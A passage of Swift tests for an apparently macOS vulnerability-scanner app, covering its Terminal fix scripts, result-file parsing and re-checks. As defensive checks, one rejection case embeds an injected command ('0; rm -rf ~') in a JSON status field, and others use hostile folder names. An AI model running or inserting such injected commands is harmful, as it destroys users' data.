                #expect(!FileManager.default.fileExists(atPath: canary), "\(evil.debugDescription) ran something via \(command)")
                let got = (try? Data(contentsOf: argvFile)).map { String(decoding: $0, as: UTF8.self).split(separator: "\0", omittingEmptySubsequences: false).dropLast().map(String.init) }
                #expect(got == expected, "\(command)\n\(output)")
                // what the app runs without a shell is the same words: ShellWords reads them as zsh did
                #expect(ShellWords.read(command, home: home).map { Array($0.words.dropFirst()) } == expected, "\(command)")
                // the result still names the finding exactly, however it is spelled
                #expect(FixResults.collect(in: dirs.results, pending: [run: id]) == [FixResult(run: run, findingID: id, status: 0)], "\(output)")
                checked += 1
            }
            // a project folder with a hostile name: `cd` goes into exactly that folder
            let folder = base.appendingPathComponent("p-" + UUID().uuidString).appendingPathComponent(evil.replacingOccurrences(of: "/", with: "_"))
            if (try? FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)) != nil {
                let inputs = UpgradeCommand.Inputs(origin: .folder(root: folder.path, lockfile: folder.appendingPathComponent("package-lock.json").path, direct: true),
                                                   name: "lodash", ecosystem: .npm, target: "4.18.1", malicious: false)
                let command = try #require(UpgradeCommand.advice(inputs, home: home).command)
                let run = UUID()
                let dirs = FixDirectories(support: base.appendingPathComponent(run.uuidString))
                let pwdRecorder = bin.appendingPathComponent("npm")
                try Data("#!/bin/sh\npwd -P > '\(argvFile.path)'\n".utf8).write(to: pwdRecorder)
                let url = try FixScript.write(scriptPlan(command, pathFirst: bin.path), run: run, directories: dirs)
                _ = try runScript(url)
                #expect(!FileManager.default.fileExists(atPath: canary), "\(evil.debugDescription) ran something via \(command)")
                let pwd = (try? String(contentsOf: argvFile, encoding: .utf8))?.trimmingCharacters(in: .newlines)
                #expect(pwd == Paths.realPath(folder.path), "\(command)")
                try Data(recorder.utf8).write(to: pwdRecorder)
            }
        }
        #expect(checked == Self.hostile(canary).count * 7)
    }

    @Test func theScriptWaitsForAKeyUnlessTestsSaySo() throws {
        let text = FixScript.contents(plan: scriptPlan("true"), run: UUID(), script: URL(fileURLWithPath: "/x/fix.command"),
                                      results: URL(fileURLWithPath: "/x/fix-results"))
        #expect(text.contains("if [[ -z ${OSVA_FIX_NO_WAIT:-} ]]; then") && text.contains("read -s -k 1"))
        #expect(text.contains("trap 'osva_record 129; exit 129' HUP"))           // a closed window still records an ending
        #expect(!text.contains("sudo") && !text.contains("osascript"))
    }
}

extension Int32 {
    func isZero(or what: String) throws { if self != 0 { throw FixScriptError("\(what) failed: \(String(cString: strerror(errno)))") } }
}

// MARK: - Result files

@Suite struct FixResultsTests {
    let run = UUID()
    let id = "brew|nginx|1.30.2"

    func dir() -> URL { let d = temporaryDirectory(); chmod(d.path, 0o700); return d }
    func put(_ text: String, in d: URL, name: String? = nil) {
        write(text, to: d.appendingPathComponent(name ?? "\(run.uuidString).json"))
    }

    @Test func aValidResultIsTakenOnce() {
        let d = dir()
        put(#"{"run":"\#(run.uuidString)","finding":"\#(id)","status":0,"finished":"2026-11-19T06:00:00Z"}"#, in: d)
        #expect(FixResults.collect(in: d, pending: [run: id]) == [FixResult(run: run, findingID: id, status: 0)])
        #expect(FixResults.collect(in: d, pending: [run: id]).isEmpty)
    }

    @Test("anything else in the folder can do nothing", arguments: [
        #"{"run":"00000000-0000-0000-0000-000000000000","finding":"brew|nginx|1.30.2","status":0}"#,        // another run
        #"{"run":"RUN","finding":"brew|curl|8.0.0","status":0}"#,                                           // another finding
        #"{"run":"RUN","finding":"brew|nginx|1.30.2","status":256}"#,                                       // not an exit status
        #"{"run":"RUN","finding":"brew|nginx|1.30.2","status":-1}"#,
        #"{"run":"RUN","finding":"brew|nginx|1.30.2"}"#,
        #"{"run":"RUN","finding":"brew|nginx|1.30.2","status":"0; rm -rf ~"}"#,
        "not json", "",
    ])
    func rejected(_ body: String) {
        let d = dir()
        put(body.replacingOccurrences(of: "RUN", with: run.uuidString), in: d)
        #expect(FixResults.collect(in: d, pending: [run: id]).isEmpty)
        #expect(!FileManager.default.fileExists(atPath: d.appendingPathComponent("\(run.uuidString).json").path))   // and it is gone
    }

    @Test func aFileThatIsTooLargeOrALinkIsNotRead() throws {
        let d = dir()
        let valid = #"{"run":"\#(run.uuidString)","finding":"\#(id)","status":0}"#
        put(valid + String(repeating: " ", count: FixResults.maxBytes), in: d)
        #expect(FixResults.collect(in: d, pending: [run: id]).isEmpty)
        let elsewhere = temporaryDirectory().appendingPathComponent("r.json")
        write(valid, to: elsewhere)
        try symlink(elsewhere.path, d.appendingPathComponent("\(run.uuidString).json").path).isZero(or: "symlink")
        #expect(FixResults.collect(in: d, pending: [run: id]).isEmpty)
        #expect(FileManager.default.fileExists(atPath: elsewhere.path))              // the link is removed, not what it points to
    }

    @Test func onlyThePendingRunsNamesAreEverOpened() {
        let d = dir()
        put(#"{"run":"\#(run.uuidString)","finding":"\#(id)","status":0}"#, in: d, name: "other.json")
        #expect(FixResults.collect(in: d, pending: [run: id]).isEmpty)
        #expect(FileManager.default.fileExists(atPath: d.appendingPathComponent("other.json").path))   // never opened, never touched
        #expect(FixResults.collect(in: d, pending: [:]).isEmpty)
    }

    @Test func theWatcherSeesAResultArrive() async throws {
        let d = dir()
        let seen = Counter()
        let w = FixResultWatcher(directory: d) { seen.increment() }
        #expect(w.start())
        defer { w.stop() }
        try await Task.sleep(for: .milliseconds(100))
        put("{}", in: d, name: "x.json.part")
        try FileManager.default.moveItem(at: d.appendingPathComponent("x.json.part"), to: d.appendingPathComponent("x.json"))
        for _ in 0..<50 where seen.value == 0 { try await Task.sleep(for: .milliseconds(20)) }
        #expect(seen.value > 0)
    }
}

final class Counter: @unchecked Sendable {
    private let lock = NSLock()
    private var n = 0
    func increment() { lock.withLock { n += 1 } }
    var value: Int { lock.withLock { n } }
}

// MARK: - What the row says after a run

@Suite struct FixOutcomeTests {
    let before = fixable(.homebrewFormula(name: "nginx"), "nginx", nil, installed: "1.30.2", fixed: "1.30.7")

    @Test func fixedOrRemovedIsSaidEvenIfTheCommandAlsoComplained() {
        #expect(FixOutcome.make(status: 0, before: before, recheck: .fixed(now: "1.30.7"), homebrew: nil).text == "Fixed — now 1.30.7")
        #expect(FixOutcome.make(status: 1, before: before, recheck: .fixed(now: "1.30.7"), homebrew: nil) == .fixed(now: "1.30.7"))
        #expect(FixOutcome.make(status: 0, before: before, recheck: .removed, homebrew: nil).text == "Removed")
    }

    @Test func aFailedCommand() {
        let still = FixOutcome.make(status: 1, before: before, recheck: .stillAffected(before), homebrew: nil)
        #expect(still == .failed(1) && still.text == "The command failed — see the Terminal window" && !still.isResolved)
        #expect(FixOutcome.make(status: 130, before: before, recheck: .couldNotCheck("offline"), homebrew: nil) == .failed(130))
        #expect(FixOutcome.failed(129).text == "The Terminal window was closed before the command finished")
    }

    @Test func stillAffectedSaysWhy() {
        let unavailable = HomebrewAvailability.unavailable("Homebrew still ships 1.30.6; the fix is 1.30.7 upstream.")
        #expect(FixOutcome.make(status: 0, before: before, recheck: .stillAffected(before), homebrew: unavailable).text
            == "Still affected: Homebrew still ships 1.30.6; the fix is 1.30.7 upstream.")
        #expect(FixOutcome.make(status: 0, before: before, recheck: .stillAffected(before), homebrew: nil).text
            == "Still affected: still 1.30.2; the command did not change it")
        var after = before
        after.installedVersion = "1.30.5"
        #expect(FixOutcome.make(status: 0, before: before, recheck: .stillAffected(after), homebrew: nil).text
            == "Still affected: now 1.30.5; the fix is 1.30.7")
        let app = fixable(.electronApp(name: "Slack", bundlePath: "/Applications/Slack.app", caskToken: "slack"), "electron", installed: "28.1.0",
                          fixed: "42.11.16", component: "Electron")
        var newer = app
        newer.installedVersion = "41.0.2"
        #expect(FixOutcome.make(status: 0, before: app, recheck: .stillAffected(newer), homebrew: nil).text
            == "Still affected: now Electron 41.0.2; the fix is 42.11.16")
    }
}

// MARK: - Checking one finding again

/// Tools whose answers change between the scan and the re-check.
final class SwitchableRunner: CommandRunner, @unchecked Sendable {
    private let lock = NSLock()
    private var outputs: [String: CommandResult]
    init(_ outputs: [String: CommandResult]) { self.outputs = outputs }
    func set(_ key: String, _ json: String) { lock.withLock { outputs[key] = CommandResult(status: 0, stdout: Data(json.utf8), stderr: Data()) } }
    func run(_ executable: String, _ arguments: [String], environment: [String: String], timeout: TimeInterval) async throws -> CommandResult {
        let key = ([executable] + arguments).joined(separator: " ")
        return lock.withLock { outputs[key] } ?? CommandResult(status: 127, stdout: Data(), stderr: Data("not recorded: \(key)".utf8))
    }
}

@Suite struct RecheckTests {
    static let brew = "/opt/homebrew/bin/brew", npm = "/opt/homebrew/bin/npm"
    static let brewKey = "\(brew) info --json=v2 --installed", npmKey = "\(npm) ls -g --json --depth=0"
    static func nginx(_ v: String) -> String {
        #"{"formulae":[{"name":"nginx","installed":[{"version":"\#(v)"}],"linked_keg":"\#(v)","homepage":"https://nginx.org/","urls":{"stable":{"url":"https://nginx.org/download/nginx-\#(v).tar.gz"}}}],"casks":[]}"#
    }
    static func lodash(_ v: String?) -> String { v.map { #"{"dependencies":{"lodash":{"version":"\#($0)"}}}"# } ?? #"{"dependencies":{}}"# }

    /// The batch answer after the scan (nil: the recorded plan, as during the scan).
    final class Later: @unchecked Sendable {
        let lock = NSLock()
        var batch: Data?
    }

    /// The recorded site, except that the batch answer can be changed after the scan.
    static func site(_ later: Later) -> RecordedTransport {
        RecordedTransport { request, _ in
            let path = request.url!.path
            switch path {
            case "/data/app-index.tsv": return .init(status: 200, headers: ["ETag": "\"v1\""], body: Fixture.data("api/app-index.tsv"))
            case "/api/v1/check/batch": return .init(status: 200, body: later.lock.withLock { later.batch } ?? Fixture.data("api/check-batch-plan.json"))
            case "/api/v1/state": return .init(status: 200, body: Fixture.data("api/state.json"))
            default:
                let slug = String(path.dropFirst("/api/v1/project/".count))
                return (try? Data(contentsOf: Fixture.url("api/project-\(slug).json"))).map { .init(status: 200, body: $0) } ?? .init(status: 404, body: Data())
            }
        }
    }

    func setUp() -> (OSVAKit.Scanner, SwitchableRunner, RecordedTransport, Later) {
        let dir = temporaryDirectory()
        let runner = SwitchableRunner([:])
        runner.set(Self.brewKey, Self.nginx("1.30.2"))
        runner.set(Self.npmKey, Self.lodash("4.17.20"))
        let tools = ToolEnvironment(home: dir, base: [:], runner: runner, isExecutable: { $0 == Self.brew || $0 == Self.npm })
        let later = Later()
        let transport = Self.site(later)
        let scanner = Scanner(configuration: ScanConfiguration(storage: Storage(directory: dir), tools: tools, folders: [], applicationRoots: []),
                              transport: transport, pause: { _ in })
        return (scanner, runner, transport, later)
    }

    @Test func aHomebrewUpgradeThatReachedTheFixIsFixed() async throws {
        let (scanner, runner, transport, _) = setUp()
        let report = await scanner.scan()
        let nginx = try #require(report.findings.first { $0.id == "brew|nginx|1.30.2" })
        let asked = transport.requests.count
        runner.set(Self.brewKey, Self.nginx("1.30.7_1"))
        let (updated, outcome) = await scanner.recheck(nginx, in: report)
        #expect(outcome == .fixed(now: "1.30.7"))
        #expect(!updated.findings.contains { $0.title == "nginx" })
        #expect(updated.inventory.homebrew.first?.version == "1.30.7")
        #expect(updated.findings.contains { $0.title == "lodash" })                 // the others are left as they were
        #expect(transport.requests.count == asked)                                  // the project's advisories came from the cache
    }

    @Test func notFarEnoughIsStillAffectedUnderItsNewVersion() async throws {
        let (scanner, runner, _, _) = setUp()
        let report = await scanner.scan()
        let nginx = try #require(report.findings.first { $0.id == "brew|nginx|1.30.2" })
        runner.set(Self.brewKey, Self.nginx("1.30.5"))
        let (updated, outcome) = await scanner.recheck(nginx, in: report)
        guard case let .stillAffected(now) = outcome else { Issue.record("\(outcome)"); return }
        #expect(now.id == "brew|nginx|1.30.5" && now.fixedVersion == "1.30.7")
        #expect(updated.findings.filter { $0.title == "nginx" }.map(\.id) == ["brew|nginx|1.30.5"])
    }

    @Test func aPackageIsAskedAboutAloneAndAfresh() async throws {
        let (scanner, runner, transport, later) = setUp()
        let report = await scanner.scan()
        let lodash = try #require(report.findings.first { $0.title == "lodash" })
        runner.set(Self.npmKey, Self.lodash("4.17.21"))
        later.lock.withLock { later.batch = Data(#"{"checked":1,"packages":[]}"#.utf8) }
        let before = transport.requests.count
        let (updated, outcome) = await scanner.recheck(lodash, in: report)
        #expect(outcome == .fixed(now: "4.17.21"))
        let sent = transport.requests.dropFirst(before)
        #expect(sent.count == 1 && sent.first?.url?.path == "/api/v1/check/batch")
        let body = String(decoding: sent.first?.httpBody ?? Data(), as: UTF8.self)
        #expect(body == #"{"packages":[{"ecosystem":"npm","name":"lodash","platform":"macos","version":"4.17.21"}]}"#)
        #expect(updated.sent.distinctItems.contains("npm lodash 4.17.21 · macOS"))   // and it is in "What leaves your Mac"
        #expect(!updated.findings.contains { $0.title == "lodash" })
    }

    @Test func aPackageThatIsGoneIsRemoved() async throws {
        let (scanner, runner, _, _) = setUp()
        let report = await scanner.scan()
        let lodash = try #require(report.findings.first { $0.title == "lodash" })
        runner.set(Self.npmKey, Self.lodash(nil))
        let (_, outcome) = await scanner.recheck(lodash, in: report)
        #expect(outcome == .removed)
    }

    @Test func aSourceThatFailsIsNotTakenForARemoval() async throws {
        let (scanner, runner, _, _) = setUp()
        let report = await scanner.scan()
        let nginx = try #require(report.findings.first { $0.id == "brew|nginx|1.30.2" })
        runner.set(Self.brewKey, "not json")
        let (updated, outcome) = await scanner.recheck(nginx, in: report)
        guard case .couldNotCheck = outcome else { Issue.record("\(outcome)"); return }
        #expect(updated == report)
    }
}
